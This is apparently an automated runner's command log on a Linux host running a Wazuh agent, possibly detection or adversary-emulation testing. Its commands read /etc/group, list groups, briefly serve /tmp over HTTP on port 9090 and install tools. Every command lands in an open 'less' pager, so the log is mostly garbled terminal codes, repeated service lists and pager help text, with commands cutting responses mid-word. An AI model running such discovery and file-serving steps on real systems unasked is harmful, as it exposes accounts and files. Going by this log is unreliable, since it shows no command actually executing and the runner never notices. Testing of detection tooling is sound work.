-[7mlines 46-68/68 (END)[m[K[K[7mlines 46-68/68 (END)[m[K[K[K[7mlines 46-68/68 (END)[m[K[K[K[7mlines 46-68/68 (END)[m[K[KBrackets: [K[[[K]][K[K[7mNo bracket in top line  (press RETURN)[m[24;1H[K[K[7mlines 46-68/68 (END)[m[K[K-[KTab stops: [K  [K""[K$$[K(([Kcc[Koo[Kmm[Kmm[Kaa[Knn[Kdd[K  [K--[Kvv[K  [Kgg[Kee[Ktt[Kee[Knn[Ktt[K))[K""[K  [K]][K;;[K  [Ktt[Khh[Kee[Knn[K  [Kgg[Kee[Ktt[Kee[Knn[Ktt[K  [Kgg[Krr[Koo[Kuu[Kpp[K;;[K  [Kee[Kll[Kss[Kee[K  [Kee[Kcc[Khh[Koo[K  [K""[Kgg[Kee[Ktt[Kee[Knn[Ktt[K  [Kii[Kss[K  [Kmm[K[Ktent group; else echo "getent is mii[Kss[Kss[Kii[Knn[Kgg[K  [Kff[Krr[Koo[Kmm[K  [Ktt[Khh[Kee[K  [Kmm[Kaa[Kcc[Khh[Kii[Knn[Kee[K..[K  [Kss[Kkk[Kii[Kpp[Kpp[Kii[Knn[Kgg[K..[K[Kissing from the machine. skipping...[K..[K""[K;;[K  [Kff[Kii[K;;[K[H[J[H  systemd-remount-fs.service           loaded active exited  Remount Root and K[m[7m>[m
-  systemd-resolved.service             loaded active running Network Name Resol[m[7m>[m
-  systemd-sysctl.
-
-action:
-command:cat /etc/group
-response:service               loaded active exited  Apply Kernel Varia[m[7m>[m
-  systemd-sysusers.service             loaded active exited  Create System Users[m
-  systemd-timesyncd.service            loaded active running Network Time Synch[m[7m>[m
-  systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Devi[m[7m>[m
-  systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Fi[m[7m>[m
-  systemd-udev-trigger.service         loaded active exited  Coldplug All udev [m[7m>[m
-  systemd-udevd.service                loaded active running Rule-based Manager[m[7m>[m
-  systemd-update-utmp.service          loaded active exited  Record System Boot[m[7m>[m
-  systemd-user-sessions.service        loaded active exited  Permit User Sessio[m[7m>[m
-  udisks2.service                      loaded active running Disk Manager[m
-  ufw.service                          loaded active exited  Uncomplicated fire[m[7m>[m
-  upower.service                       loaded active running Daemon for power m[m[7m>[m
-  user-runtime-dir@0.service           loaded active exited  User Runtime Direc[m[7m>[m
-  user@0.service                       loaded active running User Manager for U[m[7m>[m
-  wazuh-agent.service                  loaded active running Wazuh agent[m
-[m
-LOAD   = Reflects whether the unit definition was properly loaded.[m
-ACTIVE = The high-level unit activation state, i.e. generalization of SUB.[m
-SUB    = The low-level unit activation state, values depend on unit type.[m
-[0;1;39m61 loaded units listed.[0m Pass --all to see loaded but inactive units, too.[m
-To show all installed unit files use 'systemctl list-unit-files'.[m
-[7mlines 46-68/68 (END)[m[K[K[7mlines 46-68/68 (END)[m[K[K[7mlines 46-68/68 (END)[m[K[K[7mNo next tag  (press RETURN)[m[24;1H[K[K[7mlines 46-68/68 (END)[m[K[K/[Kee[Ktt[Kcc[K//[Kgg[Krr[Koo[Kuu[Kpp[K[1;1H  systemd-remount-fs.service           loaded active exited  Remount Root and K[m[7m>[m
-[2;1H  systemd-resolved.service             loaded active running Network Name Resol[m[7m>[m
-[3;1H  systemd-sysctl.service               loaded active exited  Apply Kernel Varia[m[7m>[m
-[4;1H  systemd-sysusers.service             loaded active exited  Create System Users[m
-[5;1H  systemd-timesyncd.service            loaded active running Network Time Synch[m[7m>[m
-[6;1H  systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Devi[m[7m>[m
-[7;1H  systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Fi[m[7m>[m
-[8;1H  systemd-udev-trigger.service         loaded active exited  Coldplug All udev [m[7m>[m
-[9;1H  systemd-udevd.service                loaded active running Rule-based Manager[m[7m>[m
-[10;1H  systemd-update-utmp.service          loaded active exited  Record System Boot[m[7m>[m
-[11;1H  systemd-user-sessions.service        loaded active exited  Permit User Sessio[m[7m>[m
-[12;1H  udisks2.service                      loaded active running Disk Manager[m
-[13;1H  ufw.service                          loaded active exited  Uncomplicated fire[m[7m>[m
-[14;1H  upower.service                       loaded active running Daemon for power m[m[7m>[m
-[15;1H  user-runtime-dir@0.service           loaded active exited  User Runtime Direc[m[7m>[m
-[16;1H  user@0.service                       loaded active running User Manager for U[m[7m>[m
-[17;1H  wazuh-agent.service                  loaded active running Wazuh agent[m
-[18;1H[m
-[19;1HLOAD   = Reflects whether the unit definition was properly loaded.[m
-[20;1HACTIVE = The high-level unit activation state, i.e. generalization of SUB.[m
-[21;1HSUB    = The low-level unit activation state, values depend on unit type.[m
-[22;1H[0;1;39m61 loaded units listed.[0m Pass --all to see loaded but inactive units, too.[m
-[23;1HTo show all installed unit files use 'systemctl list-unit-files'.[m
-[24;1H[1;1H  systemd-remount-fs.service           load
-
-action:
-command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
-response:ed active exited  Remount Root and K[m[7m>[m
-[2;1H  systemd-resolved.service             loaded active running Network Name Resol[m[7m>[m
-[3;1H  systemd-sysctl.service               loaded active exited  Apply Kernel Varia[m[7m>[m
-[4;1H  systemd-sysusers.service             loaded active exited  Create System Users[m
-[5;1H  systemd-timesyncd.service            loaded active running Network Time Synch[m[7m>[m
-[6;1H  systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Devi[m[7m>[m
-[7;1H  systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Fi[m[7m>[m
-[8;1H  systemd-udev-trigger.service         loaded active exited  Coldplug All udev [m[7m>[m
-[9;1H  systemd-udevd.service                loaded active running Rule-based Manager[m[7m>[m
-[10;1H  systemd-update-utmp.service          loaded active exited  Record System Boot[m[7m>[m
-[11;1H  systemd-user-sessions.service        loaded active exited  Permit User Sessio[m[7m>[m
-[12;1H  udisks2.service                      loaded active running Disk Manager[m
-[13;1H  ufw.service                          loaded active exited  Uncomplicated fire[m[7m>[m
-[14;1H  upower.service                       loaded active running Daemon for power m[m[7m>[m
-[15;1H  user-runtime-dir@0.service           loaded active exited  User Runtime Direc[m[7m>[m
-[16;1H  user@0.service                       loaded active running User Manager for U[m[7m>[m
-[17;1H  wazuh-agent.service                  loaded active running Wazuh agent[m
-[18;1H[m
-[19;1HLOAD   = Reflects whether the unit definition was properly loaded.[m
-[20;1HACTIVE = The high-level unit activation state, i.e. generalization of SUB.[m
-[21;1HSUB    = The low-level unit activation state, values depend on unit type.[m
-[22;1H[0;1;39m61 loaded units listed.[0m Pass --all to see loaded but inactive units, too.[m
-[23;1HTo show all installed unit files use 'systemctl list-unit-files'.[m
-[24;1H[K[7mPattern not found  (press RETURN)[m[24;1H[K[KBrackets: [K[[[K]][K[K[7mNo bracket in top line  (press RETURN)[m[24;1H[K[K[7mlines 46-68/68 (END)[m[K[K[7mlines 46-68/68 (END)[m[K[K[7mlines 46-68/68 (END)[m[K[KBrackets: [K(([K))[K[K[7mNo bracket in top line  (press RETURN)[m[24;1H[K[K[HM  systemd-random-seed.service          loaded active exited  Load/Save Random S[m[7m>[m
-[HM  systemd-networkd.service             loaded active running Network Configurat[m[7m>[m
-[HM  systemd-networkd-wait-online.service loaded active exited  Wait for Network t[m[7m>[m
-[HM  systemd-modules-load.service         loaded active exited  Load Kernel Modules[m
-[HM  systemd-logind.service               loaded active running User Login Managem[m[7m>[m
-[HM  systemd-journald.service             loaded active running Journal Service[m
-[HM  systemd-journal-flush.service        loaded active exited  Flush Journal to P[m[7m>[m
-[HM  systemd-binfmt.service               loaded active exited  Set Up Additional [m[7m>[m
-[HM  ssh.service                          loaded active running OpenBSD Secure She[m[7m>[m
-[HM  snapd.service                        loaded active running Snap Daemon[m
-[HM  snapd.seeded.service                 loaded active exited  Wait until snapd i[m[7m>[m
-[HM  snapd.apparmor.service               loaded active exited  Load AppArmor prof[m[7m>[m
-[24;1H[K[7mlines 34-56/68 86%[m[K[K/[K[K[7mPattern not found  (press RETURN)[m[24;1H[K[K[7mlines 34-56/68 86%[m[K[Kset mark: ...skipping...
-  snapd.apparmor.service               loaded active exited  Load AppArmor prof[m[7m>[m
-  snapd.seeded.service                 loaded active exited  Wait until snapd i[m[7m>[m
-  snapd.service                        loaded active running Snap Daemon[m
-  ssh.service                          loaded active running OpenBSD Secure She[m[7m>[m
-  systemd-binfmt.service               loaded active exited  Set Up Additio
-
-action:
-command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
-response:nal [m[7m>[m
-  systemd-journal-flush.service        loaded active exited  Flush Journal to P[m[7m>[m
-  systemd-journald.service             loaded active running Journal Service[m
-  systemd-logind.service               loaded active running User Login Managem[m[7m>[m
-  systemd-modules-load.service         loaded active exited  Load Kernel Modules[m
-  systemd-networkd-wait-online.service loaded active exited  Wait for Network t[m[7m>[m
-  systemd-networkd.service             loaded active running Network Configurat[m[7m>[m
-  systemd-random-seed.service          loaded active exited  Load/Save Random S[m[7m>[m
-  systemd-remount-fs.service           loaded active exited  Remount Root and K[m[7m>[m
-  systemd-resolved.service             loaded active running Network Name Resol[m[7m>[m
-  systemd-sysctl.service               loaded active exited  Apply Kernel Varia[m[7m>[m
-  systemd-sysusers.service             loaded active exited  Create System Users[m
-  systemd-timesyncd.service            loaded active running Network Time Synch[m[7m>[m
-  systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Devi[m[7m>[m
-  systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Fi[m[7m>[m
-  systemd-udev-trigger.service         loaded active exited  Coldplug All udev [m[7m>[m
-  systemd-udevd.service                loaded active running Rule-based Manager[m[7m>[m
-  systemd-update-utmp.service          loaded active exited  Record System Boot[m[7m>[m
-  systemd-user-sessions.service        loaded active exited  Permit User Sessio[m[7m>[m
-[7mlines 34-56/68 86%[m[K[KBrackets: [K(([K))[K[K[7mNo bracket in bottom line  (press RETURN)[m[24;1H[K[K[7mlines 34-56/68 86%[m[K[K  udisks2.service                      loaded active running Disk Manager[m
-  ufw.service                          loaded active exited  Uncomplicated fire[m[7m>[m
-  upower.service                       loaded active running Daemon for power m[m[7m>[m
-  user-runtime-dir@0.service           loaded active exited  User Runtime Direc[m[7m>[m
-  user@0.service                       loaded active running User Manager for U[m[7m>[m
-  wazuh-agent.service                  loaded active running Wazuh agent[m
-[m
-LOAD   = Reflects whether the unit definition was properly loaded.[m
-ACTIVE = The high-level unit activation state, i.e. generalization of SUB.[m
-SUB    = The low-level unit activation state, values depend on unit type.[m
-[0;1;39m61 loaded units listed.[0m Pass --all to see loaded but inactive units, too.[m
-To show all installed unit files use 'systemctl list-unit-files'.[m
-[7mlines 46-68/68 (END)[m[K[K[K[7mlines 46-68/68 byte 6149/6149 (END)  (press RETURN)[m[24;1H[K[K[7mlines 46-68/68 (END)[m[K[Kgoto mark: [K[K[7mMark not set  (press RETURN)[m[24;1H[K[K...skipping...
-  systemd-remount-fs.service           loaded active exited  Remount Root and K[m[7m>[m
-  systemd-resolved.service             loaded active running Network Name Resol[m[7m>[m
-  systemd-sysctl.service               loaded active exited  Apply Kernel Varia[m[7m>[m
-  systemd-sysusers.service             loaded active exited  Create System Users[m
-  systemd-timesyncd.service            loaded active running Network Time Synch[m[7m>[m
-  systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Devi[m[7m>[m
-  systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Fi[m[7m>[m
-  systemd-udev-trigger.service         loaded active exited  Coldplug All udev [m[7m>[m
-  systemd-udevd.service                loaded active running Rule-based Manager[m[7m>[m
-  systemd-update-utmp.service          loaded active exited  Record System Boot[m[7m>[m
-  systemd-user-sessions.service        loaded active exited  Permit User Sessio[m[7m>[m
-  udisks2.service                      loaded active running Disk Manager[m
-  ufw.service                          loaded active exited  Un
-
-action:
-command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
-response:complicated fire[m[7m>[m
-  upower.service                       loaded active running Daemon for power m[m[7m>[m
-  user-runtime-dir@0.service           loaded active exited  User Runtime Direc[m[7m>[m
-  user@0.service                       loaded active running User Manager for U[m[7m>[m
-  wazuh-agent.service                  loaded active running Wazuh agent[m
-[m
-LOAD   = Reflects whether the unit definition was properly loaded.[m
-ACTIVE = The high-level unit activation state, i.e. generalization of SUB.[m
-SUB    = The low-level unit activation state, values depend on unit type.[m
-[0;1;39m61 loaded units listed.[0m Pass --all to see loaded but inactive units, too.[m
-To show all installed unit files use 'systemctl list-unit-files'.[m
-[7mlines 46-68/68 (END)[m[K[K[K[7mlines 46-68/68 (END)[m[K[K[K[7mlines 46-68/68 (END)[m[K[K[7mlines 46-68/68 (END)[m[K[K[7mlines 46-68/68 (END)[m[K[K[7mlines 46-68/68 (END)[m[K[Kgoto mark: [K[K[7mInvalid mark letter    (press RETURN)[m[24;1H[K[KBrackets: [K[[[K]][K[K[7mNo bracket in bottom line  (press RETURN)[m[24;1H[K[K[7mlines 46-68/68 (END)[m[K[K&/[K&&[K  [Kaa[Kll[Kii[Kaa[Kss[K  [Kpp[Kyy[Ktt[Khh[Koo[Knn[K33[K==[Kpp[Kyy[Ktt[Khh[Koo[Knn[K33[K..[K99[K[H[J[H[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-& [7mlines 68-68/68 (END)[m[K[K& [7mlines 68-68/68 (END)[m[K[K[K& [7mlines 68-68/68 (END)[m[K[K[K& [7mlines 68-68/68 (END)[m[K[KBrackets: [K[[[K]][K[K[7mNo bracket in top line  (press RETURN)[m[24;1H[K[K& [7mlines 68-68/68 (END)[m[K[K& [7mlines 68-68/68 (END)[m[K[KBrackets: [K(([K))[K[K[7mNo bracket in top line  (press RETURN)[m[24;1H[K[K[K& [7mlines 68-68/68 (END)[m[K[K...skipping...
-[m
-                   [1mSUMMARY[0m [1mOF[0m [1mLESS[0m [1mCOMMANDS[0m[m
-[m
-      Commands marked with * may be preceded by a number, [4mN[m.[m
-      Notes in parentheses indicate the behavior if [4mN[m is given.[m
-      A key preceded by a caret indicates the Ctrl key; thus ^K is ctrl-K.[m
-[m
-  h  H                 Display this help.[m
-  q  :q  Q  :Q  ZZ     Exit.[m
- ---------------------------------------------------------------------------[m
-[m
-                           [1mMOVING[0m[m
-[m
-  e  ^E  j  ^N  CR  *  Forward  one line   (or [4mN[m lines).[m
-  y  ^Y  k  ^K  ^P  *  Backward one line   (or [4mN[m lines).[m
-  f  ^F  ^V  SPACE  *  Forward  one window (or [4mN[m lines).[m
-  b  ^B  ESC-v      *  Backward one window (or [4mN[m lines).[m
-  z                 *  Forward  one window (and set window to [4mN[m).[m
-  w                 *  Backward one window (and set window to [4mN[m).[m
-  ESC-SPACE         *  Forward  one window, but don't stop at end-of-file.[m
-  d  ^D             *  Forward  one half-window (and set half-window to [4mN[m).[m
-  u  ^U             *  Backward one half-window (and set half-window to [4mN[m).[m
-  ESC-)  RightArrow *  Right one half screen width (or [4mN[m positions).[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K  ESC-(  LeftArrow  *  Left  one half screen width (or [4mN[m positions).[m
-  ESC-}  ^RightArrow   Right to last column displayed.[m
-  ESC-{  ^LeftArrow    Left  to first column.[m
-  F                    Forward forever; like "tail -f".[m
-  ESC-F                Like F but stop when search pattern is found.[m
-  r  ^R  ^L            Repaint screen.[m
-  R                    Repaint screen, discarding buffered input.[m
-        ---------------------------------------------
-
-action:
-command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
-response:------[m
-        Default "window" is the screen height.[m
-        Default "half-window" is half of the screen height.[m
- ---------------------------------------------------------------------------[m
-[m
-                          [1mSEARCHING[0m[m
-[m
-  /[4mpattern[m          *  Search forward for ([4mN[m-th) matching line.[m
-  ?[4mpattern[m          *  Search backward for ([4mN[m-th) matching line.[m
-  n                 *  Repeat previous search (for [4mN[m-th occurrence).[m
-  N                 *  Repeat previous search in reverse direction.[m
-  ESC-n             *  Repeat previous search, spanning files.[m
-  ESC-N             *  Repeat previous search, reverse dir. & spanning files.[m
-  ESC-u                Undo (toggle) search highlighting.[m
-  ESC-U                Clear search highlighting.[m
-  &[4mpattern[m          *  Display only matching lines.[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[HM  ESC-)  RightArrow *  Right one half screen width (or [4mN[m positions).[m
-[HM  u  ^U             *  Backward one half-window (and set half-window to [4mN[m).[m
-[HM  d  ^D             *  Forward  one half-window (and set half-window to [4mN[m).[m
-[HM  ESC-SPACE         *  Forward  one window, but don't stop at end-of-file.[m
-[HM  w                 *  Backward one window (and set window to [4mN[m).[m
-[HM  z                 *  Forward  one window (and set window to [4mN[m).[m
-[HM  b  ^B  ESC-v      *  Backward one window (or [4mN[m lines).[m
-[HM  f  ^F  ^V  SPACE  *  Forward  one window (or [4mN[m lines).[m
-[HM  y  ^Y  k  ^K  ^P  *  Backward one line   (or [4mN[m lines).[m
-[HM  e  ^E  j  ^N  CR  *  Forward  one line   (or [4mN[m lines).[m
-[HM[m
-[HM                           [1mMOVING[0m[m
-[HM[m
-[HM ---------------------------------------------------------------------------[m
-[HM  q  :q  Q  :Q  ZZ     Exit.[m
-[HM  h  H                 Display this help.[m
-[HM[m
-[HM      A key preceded by a caret indicates the Ctrl key; thus ^K is ctrl-K.[m
-[HM      Notes in parentheses indicate the behavior if [4mN[m is given.[m
-[HM      Commands marked with * may be preceded by a number, [4mN[m.[m
-[HM[m
-[HM                   [1mSUMMARY[0m [1mOF[0m [1mLESS[0m [1mCOMMANDS[0m[m
-[HM[m
-[24;1H[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mNo next tag  (press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[KNon-match &/[K  ESC-(  LeftArrow  *  Left  one half screen width (or [4mN[m positions).[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K:[K33[KBrackets: [K(([K))[K[K[7mNo bracket in bottom line  (press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[KBrackets: [K[[[K]][K[K[7mNo bracket in bottom line  (press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K  ESC-}  ^RightArrow   Right to last column displayed.[m
-  ESC-{  ^LeftArrow    Left  to first column.[m
-  F                    Forward forever; like "tail -f".[m
-  ESC-F                Like F but stop when search pattern is found.[m
-  r  ^R  ^L            Repaint screen.[m
-  R                    Repaint screen, discarding buffered input.[m
-        ---------------------------------------------------[m
-        Default "window" is the screen height.[m
-        Default "half-window" is half of the screen height.[m
- ---------------------------------------------------------------------------[m
-[m
-                          [1mSEARCHING[0m[m
-[m
-  /[4mpattern[m          *  Search forward for ([4mN[m-th) matching line.[m
-  ?[4mpattern[m          *  Search backward for ([4mN[m-th) matching line.[m
-  n                 *  Repeat previous search (for [4mN[m-th occurrence).[m
-  N                 *  Repeat
-
-action:
-command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
-response: previous search in reverse direction.[m
-  ESC-n             *  Repeat previous search, spanning files.[m
-  ESC-N             *  Repeat previous search, reverse dir. & spanning files.[m
-  ESC-u                Undo (toggle) search highlighting.[m
-  ESC-U                Clear search highlighting.[m
-  &[4mpattern[m          *  Display only matching lines.[m
-        ---------------------------------------------------[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mNo next tag  (press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K        A search pattern may begin with one or more of:[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[KNon-match &/[K        ^N or !  Search for NON-matching lines.[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K        ^E or *  Search multiple files (pass thru END OF FILE).[m
-        ^F or @  Start search at FIRST file (for /) or last file (for ?).[m
-        ^K       Highlight matches, but don't move (KEEP position).[m
-        ^R       Don't use REGULAR EXPRESSIONS.[m
-        ^W       WRAP search if no match found.[m
- ---------------------------------------------------------------------------[m
-[m
-                           [1mJUMPING[0m[m
-[m
-  g  <  ESC-<       *  Go to first line in file (or line [4mN[m).[m
-  G  >  ESC->       *  Go to last line in file (or line [4mN[m).[m
-  p  %              *  Go to beginning of file (or [4mN[m percent into file).[m
-  t                 *  Go to the ([4mN[m-th) next tag.[m
-  T                 *  Go to the ([4mN[m-th) previous tag.[m
-  {  (  [           *  Find close bracket } ) ].[m
-  }  )  ]           *  Find open bracket { ( [.[m
-  ESC-^F [4m<c1>[m [4m<c2>[m  *  Find close bracket [4m<c2>[m.[m
-  ESC-^B [4m<c1>[m [4m<c2>[m  *  Find open bracket [4m<c1>[m.[m
-        ---------------------------------------------------[m
-        Each "find close bracket" command goes forward to the close bracket [m
-          matching the ([4mN[m-th) open bracket in the top line.[m
-        Each "find open bracket" command goes backward to the open bracket [m
-          matching the ([4mN[m-th) close bracket in the bottom line.[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[m
-  m[4m<letter>[m            Mark the current top line with <letter>.[m
-  M[4m<letter>[m            Mark the current bottom line with <letter>.[m
-  '[4m<letter>[m            Go to a previously marked position.[m
-  ''                   Go to the previous position.[m
-  ^X^X                 Same as '.[m
-  ESC-M[4m<letter>[m        Clear a mark.[m
-        ---------------------------------------------------[m
-        A mark is any upper-case or lower-case letter.[m
-        Certain marks are predefined:[m
-             ^  means  beginning of the file[m
-             $  means  end of the file[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K ---------------------------------------------------------------------------[m
-[m
-                        [1mCHANGING[0m [1mFILES[0m[m
-[m
-  :e [[4mfile[m]            Examine a new file.[m
-  ^X^V                 Same as :e.[m
-  :n                *  Examine the ([4mN[m-th) next file from the command line.[m
-  :p                *  Examine the ([4mN[m-th) previous file from the command line.[m
-  :x                *  Examine the first (or [4mN[m-th) file from the command line.[m
-  :d                   Delete the current file from the command line list.[m
-  =  ^G  :f            Print current file name.[m
- ---------------------------------------------------------------------------[m
-[m
-                    [1mMISCELLANEOUS[0m [1mCOMMANDS[0m[m
-[m
-  -[4m<flag>[m              Toggle a command line option [see OPTIONS below].[m
-  --[4m<name>[m             Toggle a command line option, by name.[m
-  _[4m<flag>[m              Display the setting of a comm
-
-action:
-command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
-response:and line option.[m
-  __[4m<name>[m             Display the setting of an option, by name.[m
-  +[4mcmd[m                 Execute the less cmd each time a new file is examined.[m
-[m
-  ![4mcommand[m             Execute the shell command with $SHELL.[m
-  |[1mX[0m[4mcommand[m            Pipe file between current pos & mark [1mX[0m to shell command.[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K/[Ktt[Kmm[Kpp[K;;[K  [Kpp[Kyy[Ktt[Khh[Koo[Knn[K33[K  [K--[Kmm[K  [Khh[Ktt[Ktt[Kpp[K..[Kss[Kee[Krr[Kvv[Kee[Krr[K  [K99[K00[K99[K00[K  [K&&[K  [KPP[KII[KDD[K==[K$$[K!![K;;[K  [Kss[Kll[Kee[Kee[Kpp[K  [K11[K00[K;;[K  [Kkk[Kii[Kll[Kll[K  [K$$[KPP[KII[KDD[K;;[K  [Kuu[Knn[Kss[Kee[Ktt[K  [KPP[KII[KDD[K;;[K  [Kff[Kii[K[1;1H ---------------------------------------------------------------------------[m
-[2;1H[m
-[3;1H                        [1mCHANGING[0m [1mFILES[0m[m
-[4;1H[m
-[5;1H  :e [[4mfile[m]            Examine a new file.[m
-[6;1H  ^X^V                 Same as :e.[m
-[7;1H  :n                *  Examine the ([4mN[m-th) next file from the command line.[m
-[8;1H  :p                *  Examine the ([4mN[m-th) previous file from the command line.[m
-[9;1H  :x                *  Examine the first (or [4mN[m-th) file from the command line.[m
-[10;1H  :d                   Delete the current file from the command line list.[m
-[11;1H  =  ^G  :f            Print current file name.[m
-[12;1H ---------------------------------------------------------------------------[m
-[13;1H[m
-[14;1H                    [1mMISCELLANEOUS[0m [1mCOMMANDS[0m[m
-[15;1H[m
-[16;1H  -[4m<flag>[m              Toggle a command line option [see OPTIONS below].[m
-[17;1H  --[4m<name>[m             Toggle a command line option, by name.[m
-[18;1H  _[4m<flag>[m              Display the setting of a command line option.[m
-[19;1H  __[4m<name>[m             Display the setting of an option, by name.[m
-[20;1H  +[4mcmd[m                 Execute the less cmd each time a new file is examined.[m
-[21;1H[m
-[22;1H  ![4mcommand[m             Execute the shell command with $SHELL.[m
-[23;1H  |[1mX[0m[4mcommand[m            Pipe file between current pos & mark [1mX[0m to shell command.[m
-[24;1H[1;1H ---------------------------------------------------------------------------[m
-[2;1H[m
-[3;1H                        [1mCHANGING[0m [1mFILES[0m[m
-[4;1H[m
-[5;1H  :e [[4mfile[m]            Examine a new file.[m
-[6;1H  ^X^V                 Same as :e.[m
-[7;1H  :n                *  Examine the ([4mN[m-th) next file from the command line.[m
-[8;1H  :p                *  Examine the ([4mN[m-th) previous file from the command line.[m
-[9;1H  :x                *  Examine the first (or [4mN[m-th) file from the command line.[m
-[10;1H  :d                   Delete the current file from the command line list.[m
-[11;1H  =  ^G  :f            Print current file name.[m
-[12;1H ---------------------------------------------------------------------------[m
-[13;1H[m
-[14;1H                    [1mMISCELLANEOUS[0m [1mCOMMANDS[0m[m
-[15;1H[m
-[16;1H  -[4m<flag>[m              Toggle a command line option [see OPTIONS below].[m
-[17;1H  --[4m<name>[m             Toggle a command line option, by name.[m
-[18;1H  _[4m<flag>[m              Display the setting of a command line option.[m
-[19;1H  __[4m<name>[m             Display the setting of an option, by name.[m
-[20;1H  +[4mcmd[m                 Execute the less cmd each time a new file is examined.[m
-[21;1H[m
-[22;1H  ![4mcommand[m             Execute the shell command with $SHELL.[m
-[23;1H  |[1mX[0m[4mcommand[m            Pipe file between current pos & mark [1mX[0m to shell command.[m
-[24;1H[K[7mPattern not found  (press RETURN)[m[24;1H[K[KBrackets: [K[[[K]][K[K[7mNo bracket in top line  
-
-action:
-command:cd $HOME
-response:(press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[KBrackets: [K(([K))[K[K[7mNo bracket in top line  (press RETURN)[m[24;1H[K[K[HM             $  means  end of the file[m
-[HM             ^  means  beginning of the file[m
-[HM        Certain marks are predefined:[m
-[HM        A mark is any upper-case or lower-case letter.[m
-[HM        ---------------------------------------------------[m
-[HM  ESC-M[4m<letter>[m        Clear a mark.[m
-[HM  ^X^X                 Same as '.[m
-[HM  ''                   Go to the previous position.[m
-[HM  '[4m<letter>[m            Go to a previously marked position.[m
-[HM  M[4m<letter>[m            Mark the current bottom line with <letter>.[m
-[HM  m[4m<letter>[m            Mark the current top line with <letter>.[m
-[HM[m
-[24;1H[K[7mHELP -- Press RETURN for more, or q when done[m[K[K/[K[K[7mPattern not found  (press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K ---------------------------------------------------------------------------[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[KBrackets: [K(([K))[K[K[7mNo bracket in bottom line  (press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[m
-                    [1mMISCELLANEOUS[0m [1mCOMMANDS[0m[m
-[m
-  -[4m<flag>[m              Toggle a command line option [see OPTIONS below].[m
-  --[4m<name>[m             Toggle a command line option, by name.[m
-  _[4m<flag>[m              Display the setting of a command line option.[m
-  __[4m<name>[m             Display the setting of an option, by name.[m
-  +[4mcmd[m                 Execute the less cmd each time a new file is examined.[m
-[m
-  ![4mcommand[m             Execute the shell command with $SHELL.[m
-  |[1mX[0m[4mcommand[m            Pipe file between current pos & mark [1mX[0m to shell command.[m
-  s [4mfile[m               Save input to a file.[m
-  v                    Edit the current file with $VISUAL or $EDITOR.[m
-  V                    Print version number of "less".[m
- ---------------------------------------------------------------------------[m
-[m
-                           [1mOPTIONS[0m[m
-[m
-        Most options may be changed either on the command line,[m
-        or from within less by using the - or -- command.[m
-        Options may be given in one of two forms: either a single[m
-        character preceded by a -, or a name preceded by --.[m
-[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K  -?  ........  --help[m
-                  Display help (from command line).[m
-  -a  ........  --search-skip-screen[m
-                  Search skips current screen.[m
-  -A  ........  --SEARCH-SKIP-SCREEN[m
-                  Search starts just after target line.[m
-  -b [[4mN[m]  ....  --buffers=[[4mN[m][m
-                  Number of buffers.[m
-  -B  ........  --auto-buffers[m
-                  Don't automatically allocate buffers for pipes.[m
-  -c  ........  --clear-screen[m
-                  Repaint by clearing rather than scrolling.[m
-  -d  ........  --dumb[m
-                  Dumb terminal.[m
-  -D [1mx[0m[4mcolor[m  .  --color=[1mx[0m[4mcolor[m[m
-                  Set screen colors.[m
-  -e  -E  ....  --quit-at-eof  --QUIT-AT-EOF[m
-                  Quit at end of file.[m
-  -f  ........  --force[m
-                  Force open non-regular files.[m
